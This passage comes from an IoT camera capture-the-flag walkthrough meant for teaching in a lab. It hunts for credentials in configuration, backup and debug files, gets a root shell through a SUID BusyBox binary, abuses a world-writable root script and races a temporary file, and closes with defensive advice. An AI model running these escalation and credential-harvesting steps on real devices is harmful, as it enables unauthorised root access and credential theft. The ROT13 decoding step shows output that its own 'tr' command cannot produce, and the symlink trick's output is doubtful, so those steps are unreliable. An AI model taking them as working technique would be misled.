> **OWASP IoT**: #4 - Lack of Secure Update Mechanism

#### Legacy Service Discovery

```bash
# Look for old/vulnerable services
ps aux | grep -i daemon
find / -name "*legacy*" -o -name "*daemon*" 2>/dev/null
/usr/sbin/legacy_daemon
```

**Output:**
```
Legacy Daemon v1.0 (CVE-2017-9765 vulnerable)
Service ID: FLAG{SAURON52063398}
Daemon started successfully
```

> 🏁 **FLAG #16 FOUND!**
> **Flag**: FLAG{S***********8}
> **Learning Objective**: Outdated components
> **OWASP IoT**: #5 - Use of Insecure or Outdated Components

#### API Configuration

```bash
# Search for API configurations
find /etc -name "*.conf" | xargs grep -l "api" 2>/dev/null
cat /etc/config/api.conf
```

**Output:**
```
# API Configuration
api_endpoint=https://api.axis-cloud.com
api_key=sk_live_FLAG{GOLLUM14895250}
api_version=v3
rate_limit=1000
```

> 🏁 **FLAG #17 FOUND!**
> **Flag**: FLAG{G***********0}
> **Learning Objective**: API key security
> **OWASP IoT**: #7 - Insecure Data Transfer and Storage

#### Debug Interface Discovery

```bash
# Check for debug interfaces
find / -name "*debug*" 2>/dev/null | grep -v lib
cat /sys/debug/enabled
```

**Output:**
```
DEBUG_MODE=1
DEBUG_PORT=9999
DEBUG_TOKEN=FLAG{EOWYN77727102}
DEBUG_LEVEL=VERBOSE
```

> 🏁 **FLAG #18 FOUND!**
> **Flag**: FLAG{E***********2}
> **Learning Objective**: Debug interfaces in production
> **OWASP IoT**: #8 - Lack of Device Management

#### Hidden Directories and Files

```bash
# Look for hidden content
find / -type d -name ".*" 2>/dev/null | grep -v proc
ls -la /var/.hidden/
```

**Output:**
```
total 12
drwxr-xr-x    2 root     root          4096 Jan  1 00:00 .
drwxr-xr-x   10 root     root          4096 Jan  1 00:00 ..
-rw-r--r--    1 root     root           128 Jan  1 00:00 backdoor_key
```

```bash
cat /var/.hidden/backdoor_key
```

**Output:**
```
# Maintenance Backdoor
# DO NOT REMOVE - Required for support
# Access Code: FLAG{ARWEN09143028}
# Last Used: Never
```

> 🏁 **FLAG #19 FOUND!**
> **Flag**: FLAG{A***********8}
> **Learning Objective**: Hidden backdoors
> **OWASP IoT**: #8 - Lack of Device Management

#### Backup File Discovery

```bash
# Search for backup files
find / -name "*backup*" -o -name "*.bak" -o -name "*.old" 2>/dev/null
ls -la /var/www/backup/
```

**Output:**
```
-rw-r--r--    1 root     root           256 Jan  1 00:00 ssh_config_backup.txt
```

```bash
cat /var/www/backup/ssh_config_backup.txt
```

**Output:**
```
# SSH Configuration Backup
# Created: 2024-01-01
# Admin Note: Remember to remove before production!
# Backup Access Key: FLAG{ISILDUR97638584}
```

> 🏁 **FLAG #20 FOUND!**
> **Flag**: FLAG{I***********4}
> **Learning Objective**: Backup file security
> **OWASP IoT**: #8 - Lack of Device Management

#### Shadow File Analysis

```bash
# Look for password hints
find / -name "*shadow*" -o -name "*pass*" -o -name "*hint*" 2>/dev/null
cat /var/log/shadow_hint.txt
```

**Output:**
```
Service Account Password Audit Log
Date: 2024-01-01
Auditor: Security Team

Service account 'camera_svc' password:
Pattern: service_[identifier]
Current: service_FLAG{LEGOLAS10721320}
Status: WEAK - Needs rotation
```

> 🏁 **FLAG #21 FOUND!**
> **Flag**: FLAG{L***********0}
> **Learning Objective**: Password audit trails
> **OWASP IoT**: #1 - Weak Passwords

---

## Phase 5: Privilege Escalation

### SUID Binary Enumeration

#### Understanding SUID Exploitation
SUID (Set User ID) binaries run with the owner's privileges. If owned by root, they can provide privilege escalation.

```bash
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null
```

**Output:**
```
/usr/bin/passwd
/usr/bin/su
/bin/mount
/bin/umount
/bin/ping
/tmp/busybox_suid
```

`/tmp/busybox_suid` is unusual and suspicious!

```bash
# Examine the suspicious SUID binary
ls -la /tmp/busybox_suid
file /tmp/busybox_suid
```

**Output:**
```
-rwsr-xr-x 1 root root 234576 Jan 1 00:00 /tmp/busybox_suid
/tmp/busybox_suid: ELF 32-bit LSB executable, ARM
```

```bash
# BusyBox with SUID can spawn root shell
/tmp/busybox_suid sh -p
whoami
```

**Output:**
```
root
```

```bash
# Get the privilege escalation flag
cat /root/suid_flag
```

**Output:**
```
Congratulations on privilege escalation!
FLAG{FRODO29054510}
```

> 🏁 **FLAG #22 FOUND!**
> **Flag**: FLAG{F***********0}
> **Learning Objective**: SUID binary exploitation
> **Privilege Escalation Technique**

### World-Writable Script Exploitation

```bash
# Find world-writable files
find / -type f -perm -002 2>/dev/null | grep -v proc | grep -v sys
```

**Output:**
```
/usr/local/bin/backup.sh
/usr/local/bin/update_firmware
/usr/local/bin/check_updates
```

```bash
# Examine writable scripts
ls -la /usr/local/bin/backup.sh
cat /usr/local/bin/backup.sh
```

**Output:**
```
-rwxrwxrwx 1 root root 128 Jan 1 00:00 /usr/local/bin/backup.sh

#!/bin/sh
# Backup Script - Runs as root via cron
echo "Starting backup..."
echo "Backup ID: FLAG{GANDALF60470436}"
# Backup code here
```

```bash
# Execute to get flag
/usr/local/bin/backup.sh
```

**Output:**
```
Starting backup...
Backup ID: FLAG{GANDALF60470436}
```

> 🏁 **FLAG #23 FOUND!**
> **Flag**: FLAG{G***********6}
> **Learning Objective**: World-writable script risks
> **Privilege Escalation Technique**

```bash
# Check update script
/usr/local/bin/check_updates
```

**Output:**
```
Checking for updates...
Server: update.axis.com
Server fingerprint: FLAG{THORIN20647472}
No updates available
```

> 🏁 **FLAG #24 FOUND!**
> **Flag**: FLAG{T***********2}
> **Learning Objective**: Update mechanism security
> **OWASP IoT**: #4 - Lack of Secure Update

---

## Phase 6: Advanced Exploitation

### Encrypted Credential Analysis

```bash
# Search for encrypted files
find / -name "*encrypt*" -o -name "*cipher*" -o -name "*crypt*" 2>/dev/null
cat /var/config/encrypted_pass
```

**Output:**
```
# Encrypted Password Storage
# Algorithm: Advanced Encryption (ROT13-5)
# Note: Custom implementation for security
admin_user=camera_admin
admin_pass_encrypted=KFNL{KNWFRNW46311176}
system_id=internal
```

This uses a custom ROT13 variant. Let's decode:

```bash
# First, handle special characters
echo "KFNL{KNWFRNW46311176}" | sed 's/{/{/g' | tr 'N-ZA-Mn-za-m' 'A-Za-z'
```

**Decoded Output:**
```
FLAG{FARAMIR46311176}
```

> 🏁 **FLAG #25 FOUND!**
> **Flag**: FLAG{F***********6}
> **Learning Objective**: Weak cryptographic implementations
> **OWASP IoT**: #7 - Insecure Data Transfer and Storage

### Physical Security Information

```bash
# Check boot configuration for physical access
find /boot -type f 2>/dev/null
cat /boot/uboot.env
```

**Output:**
```
bootdelay=3
baudrate=115200
console=ttyS0,115200
unlock_code=FLAG{RADAGAST03390806}
autoboot=yes
```

> 🏁 **FLAG #26 FOUND!**
> **Flag**: FLAG{R***********6}
> **Learning Objective**: Physical security - UART access
> **OWASP IoT**: #10 - Lack of Physical Hardening

```bash
# Check for JTAG information
find /sys -name "*jtag*" 2>/dev/null
cat /sys/devices/jtag/idcode
```

**Output:**
```
IDCODE: 0x4BA00477
MANUFACTURER: AXIS
DEBUG_KEY: FLAG{GLORFINDEL34806732}
ACCESS_LEVEL: FULL
```

> 🏁 **FLAG #27 FOUND!**
> **Flag**: FLAG{G***********2}
> **Learning Objective**: Physical security - JTAG access
> **OWASP IoT**: #10 - Lack of Physical Hardening

### Race Condition Exploitation

```bash
# Find scripts with potential race conditions
find / -name "*race*" 2>/dev/null
cat /usr/local/bin/race.sh
```

**Output:**
```bash
#!/bin/sh
# Race condition demonstration
# This script creates and deletes a file quickly
TMPFILE="/var/log/race_flag"
echo "FLAG{ARAGORN91886362}" > $TMPFILE
sleep 0.1  # Small window of opportunity
rm -f $TMPFILE
echo "Process completed"
```

To exploit this race condition:

```bash
# Terminal 1: Set up monitoring loop
while true; do
    if [ -f /var/log/race_flag ]; then
        cat /var/log/race_flag
        echo "[+] Flag captured!"
        break
    fi
done &

# Terminal 2: Trigger the race condition
/usr/local/bin/race.sh
```

**Output:**
```
FLAG{ARAGORN91886362}
[+] Flag captured!
Process completed
```

Alternative method using symbolic links:

```bash
# Create symlink to capture output
ln -sf /dev/stdout /var/log/race_flag
/usr/local/bin/race.sh
```

**Output:**
```
FLAG{ARAGORN91886362}
rm: can't remove '/var/log/race_flag': Permission denied
Process completed
```

> 🏁 **BONUS FLAG FOUND!**
> **Flag**: FLAG{A***********2}
> **Learning Objective**: Race condition exploitation
> **Advanced Technique**

---

## Attack Path Summary

### Complete Flag Collection

| # | Flag | Location | Method | OWASP IoT Category |
|---|------|----------|--------|-------------------|
| 1 | FLAG{G***6} | SSH Banner | Information Disclosure | #2 - Insecure Network Services |
| 2 | FLAG{M***4} | HTML Comment | Source Code Review | #3 - Insecure Ecosystem Interfaces |
| 3 | FLAG{S***4} | streams.txt | Configuration Exposure | #6 - Insufficient Privacy Protection |
| 4 | FLAG{P***0} | param.cgi | Debug Function | #8 - Lack of Device Management |
| 5 | FLAG{E***6} | pwdgrp.cgi | Blind Command Injection | #3 - Insecure Ecosystem Interfaces |
| 6 | FLAG{G***0} | system.conf | Path Traversal | #3 - Insecure Ecosystem Interfaces |
| 7 | FLAG{E***8} | webhook.cgi | SSRF | #3 - Insecure Ecosystem Interfaces |
| 8 | FLAG{T***4} | SNMP | Default Community String | #9 - Insecure Default Settings |
| 9 | FLAG{T***0} | UPnP | Information Disclosure | #9 - Insecure Default Settings |
| 10 | FLAG{M***8} | /etc/passwd | User Enumeration | #1 - Weak Passwords |
| 11 | FLAG{G***8} | vapix.conf | Configuration File | #7 - Insecure Data Storage |
| 12 | FLAG{A***4} | onvif_auth | ROT13 Encoding | #1 - Weak Passwords |
| 13 | FLAG{B***2} | authorized_keys | SSH Key Comment | #2 - Insecure Network Services |
| 14 | FLAG{S***8} | stream1.sdp | RTSP Metadata | #2 - Insecure Network Services |
| 15 | FLAG{B***6} | firmware_update.sh | Update Script | #4 - Lack of Secure Update |
| 16 | FLAG{S***8} | legacy_daemon | Outdated Service | #5 - Outdated Components |
| 17 | FLAG{G***0} | api.conf | API Key Exposure | #7 - Insecure Data Storage |
| 18 | FLAG{E***2} | debug/enabled | Debug Interface | #8 - Lack of Device Management |
| 19 | FLAG{A***8} | backdoor_key | Hidden Backdoor | #8 - Lack of Device Management |
| 20 | FLAG{I***4} | ssh_config_backup | Backup File | #8 - Lack of Device Management |
| 21 | FLAG{L***0} | shadow_hint | Password Audit | #1 - Weak Passwords |
| 22 | FLAG{F***0} | suid_flag | SUID Exploitation | Privilege Escalation |
| 23 | FLAG{G***6} | backup.sh | World-Writable Script | Privilege Escalation |
| 24 | FLAG{T***2} | check_updates | Update Server | #4 - Lack of Secure Update |
| 25 | FLAG{F***6} | encrypted_pass | Weak Encryption | #7 - Insecure Data Storage |
| 26 | FLAG{R***6} | uboot.env | Physical Access | #10 - Lack of Physical Hardening |
| 27 | FLAG{G***2} | jtag/idcode | JTAG Access | #10 - Lack of Physical Hardening |

### Attack Methodology Flow

```
1. Reconnaissance
   ├── Port Scanning → Service Discovery
   ├── Banner Grabbing → FLAG{G***6}
   └── Service Enumeration → Attack Surface

2. Web Application Testing
   ├── Source Code Review → FLAG{M***4}
   ├── Directory Enumeration → Multiple Paths
   ├── File Discovery → FLAG{S***4}
   ├── CGI Exploitation
   │   ├── param.cgi → FLAG{P***0}
   │   ├── pwdgrp.cgi → FLAG{E***6}
   │   └── webhook.cgi → FLAG{E***8}
   └── Path Traversal → FLAG{G***0}

3. Service Exploitation
   ├── SNMP → FLAG{T***4}
   ├── UPnP → FLAG{T***0}
   └── SSH Brute Force → System Access

4. Post-Exploitation
   ├── Configuration Files → Multiple Flags
   ├── User Enumeration → FLAG{M***8}
   ├── Service Discovery → Multiple Flags
   └── Hidden Content → Multiple Flags

5. Privilege Escalation
   ├── SUID Binary → FLAG{F***0}
   └── Writable Scripts → Multiple Flags

6. Advanced Techniques
   ├── Cryptanalysis → FLAG{F***6}
   ├── Physical Security → FLAG{R***6}, FLAG{G***2}
   └── Race Conditions → Bonus Flags
```

### Key Vulnerabilities Exploited

| Vulnerability Type | Count | Impact |
|-------------------|-------|---------|
| Information Disclosure | 8 | High |
| Command Injection | 2 | Critical |
| Path Traversal | 1 | High |
| SSRF | 1 | High |
| Weak Credentials | 5 | Critical |
| Weak Cryptography | 2 | Medium |
| Insecure Permissions | 3 | High |
| Debug Interfaces | 2 | High |
| Physical Security | 2 | Critical |

### Professional Skills Developed

#### Technical Skills
1. **Network Security**
   - Port scanning and service enumeration
   - Protocol analysis (SSH, HTTP, RTSP, SNMP)
   - Network service exploitation

2. **Web Application Security**
   - Directory enumeration techniques
   - Command injection identification and exploitation
   - Path traversal and filter bypasses
   - SSRF discovery and impact

3. **System Security**
   - Linux privilege escalation
   - Configuration file analysis
   - Service misconfiguration exploitation
   - Binary analysis basics

4. **Cryptography**
   - Identifying weak encoding schemes
   - Basic cryptanalysis
   - Understanding crypto vs encoding

5. **Physical Security**
   - UART interface implications
   - JTAG debugging risks
   - Boot process security

#### Professional Skills
1. **Documentation**
   - Detailed note-taking
   - Proof of concept development
   - Report-ready evidence collection

2. **Methodology**
   - Systematic enumeration
   - Tool selection and comparison
   - Alternative approach strategies

3. **Problem Solving**
   - Filter bypass techniques
   - Blind exploitation methods
   - Race condition identification

### Blue Team Perspective

#### Detection Opportunities
1. **Network Level**
   - Port scanning detection (rapid connections)
   - Brute force attempts (failed SSH logins)
   - SNMP community string attempts
   - Unusual RTSP access patterns

2. **Application Level**
   - Web scanner user agents
   - Directory enumeration patterns
   - Command injection payloads in logs
   - Path traversal attempts

3. **System Level**
   - New user creation
   - SUID binary execution
   - Configuration file access
   - Debug interface activation

#### Defensive Recommendations

1. **Immediate Actions**
   ```bash
   # Change all default credentials
   passwd root
   
   # Disable unnecessary services
   systemctl disable snmpd
   systemctl disable upnp
   
   # Remove debug interfaces
   rm /sys/debug/enabled
   rm /usr/local/bin/race.sh
   
   # Fix file permissions
   chmod 600 /etc/shadow
   chmod 700 /usr/local/bin/*.sh
   ```

2. **Configuration Hardening**
   - Remove all debug code and comments
   - Implement input validation on all CGI scripts
   - Use strong encryption (not ROT13!)
   - Enable authentication on all services
   - Implement rate limiting

3. **Long-term Security**
   - Regular security updates
   - Penetration testing schedule
   - Security awareness training
   - Incident response planning
   - Network segmentation for IoT

### Career Development Advice

#### Next Steps After This CTF

1. **Certifications to Consider**
   - **Entry Level**: CompTIA Security+, eJPT
   - **Intermediate**: OSCP, GPEN, CEH
   - **Advanced**: OSEP, SANS SEC660
   - **IoT Specific**: IoT Security Foundation

2. **Skills to Develop Further**
   - Firmware analysis (binwalk, firmwalker)
   - Hardware hacking (UART, JTAG, SPI)
   - Protocol reverse engineering
   - Exploit development
   - Report writing

3. **Practice Platforms**
   - HackTheBox (IoT challenges)
   - TryHackMe (IoT rooms)
   - VulnHub (IoT-specific VMs)
   - OWASP IoTGoat
   - Damn Vulnerable IoT Device (DVID)

4. **Real-World Application**
   - Bug bounty programs (many include IoT)
   - Responsible disclosure practice
   - Contributing to IoT security tools
   - Building your own vulnerable IoT lab

### Ethical Considerations

> **⚠️ Important Reminder**: The techniques learned in this CTF should ONLY be used on systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal and unethical.

#### Responsible Disclosure Process
1. Identify vulnerability
2. Document thoroughly
3. Contact vendor privately
4. Allow reasonable time for patch
5. Coordinate disclosure
6. Share knowledge responsibly

#### Professional Ethics
- Always obtain written authorization
- Respect scope boundaries
- Protect client data
- Report findings accurately
- Maintain confidentiality
- Continue learning and improving

---

## Conclusion

This CTF has provided hands-on experience with real vulnerabilities found in production IoT cameras. The skills developed here directly translate to professional penetration testing and security research.

### Key Takeaways
1. **IoT devices have unique attack surfaces** requiring specialized knowledge
2. **Default configurations are dangerous** and commonly exploited
3. **Physical security matters** - UART and JTAG provide backdoors
4. **Defense in depth is critical** - one vulnerability often leads to another
5. **Documentation is professional** - detailed notes are invaluable

### Your Learning Journey
- ✅ Completed comprehensive IoT security assessment
- ✅ Exploited 27 different vulnerabilities
- ✅ Learned multiple tools and techniques
- ✅ Understood OWASP IoT Top 10
- ✅ Developed professional methodology

### Continue Your Education
- Join security communities (Discord, Reddit, Forums)
- Attend security conferences (DEF CON, BSides)
- Contribute to open source security tools
- Practice regularly on CTF platforms
- Share knowledge through blogs or videos

Remember: With great power comes great responsibility. Use these skills to make the digital world safer for everyone.

---

*This walkthrough is for educational purposes only. Always ensure you have explicit written permission before testing any system.*